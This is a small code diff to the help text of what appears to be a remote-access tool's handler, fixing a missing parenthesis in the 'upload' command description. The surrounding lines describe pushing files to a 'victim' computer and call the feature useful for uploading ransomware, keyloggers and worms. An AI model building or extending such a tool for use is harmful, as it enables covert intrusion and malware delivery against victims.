@@ -27,7 +27,7 @@ void Man::upload()
 {
 	print_status("#\t\t\t Upload\t\t\t#");
 	print_status("Synthax : upload <your_file> ");
-	print_status("The handler (you) will upload a file (located in the same folder as the handler)";
+	print_status("The handler (you) will upload a file (located in the same folder as the handler)");
 	print_status("toward the computer's victim");
 	print_status("You can change directory to upload where you want by taping cd <directory>");
 	print_status("Very usefull for uploading ransomeware, keylogger, worm etc ..");
